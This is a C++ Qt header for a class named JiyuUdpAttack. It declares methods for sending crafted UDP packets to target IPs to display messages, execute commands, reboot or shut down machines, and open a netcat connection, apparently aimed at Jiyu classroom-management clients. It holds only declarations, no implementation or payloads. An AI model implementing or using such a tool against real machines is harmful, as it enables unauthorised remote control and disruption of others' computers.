#ifndef JIYUUDPATTACK_H
#define JIYUUDPATTACK_H

#include <QObject>
#include <QUdpSocket>
#include <QHostAddress>
#include <QByteArray>
#include <QStringList>
#include <QVector>

class JiyuUdpAttack : public QObject
{
    Q_OBJECT

public:
    enum PacketType {
        PacketMsg = 0,
        PacketCmd = 1,
        PacketReboot = 2,
        PacketShutdown = 3
    };

    enum ExtraOption {
        OptionNone = 0,
        OptionReboot = 1,
        OptionShutdown = 2,
        OptionGetInfo = 3,
        OptionNetcat = 4,
        OptionBreak = 5,
        OptionContinue = 6
    };

    explicit JiyuUdpAttack(QObject *parent = nullptr);
    ~JiyuUdpAttack();

    void setTargetIp(const QString &ip);
    void setPort(int port);
    void setLoopCount(int count);
    void setLoopInterval(int interval);

    bool sendMessage(const QString &message);
    bool executeCommand(const QString &command);
    bool reboot();
    bool shutdown();
    void getLocalInfo();
    void breakControl();
    void continueControl();
    bool netcat(int port);

    bool attack(ExtraOption option = OptionNone);
    bool attackWithMessage(const QString &message);
    bool attackWithCommand(const QString &command);

signals:
    void statusMessage(const QString &msg);
    void attackCompleted();
    void errorOccurred(const QString &error);

private:
    QStringList parseIpAddress(const QString &ip);
    QByteArray formatMessage(const QString &content);
    QByteArray buildPacket(PacketType type, const QByteArray &content);
    bool sendUdpPacket(const QByteArray &packet, const QHostAddress &addr, int port);
    void initPackets();

    QString m_targetIp;
    int m_port;
    int m_loopCount;
    int m_loopInterval;
    
    QVector<QByteArray> m_packets;
    QUdpSocket m_socket;
    
    static const int MsgPacketSize = 1024;
    static const int CmdPacketSize = 2048;
};

#endif // JIYUUDPATTACK_H
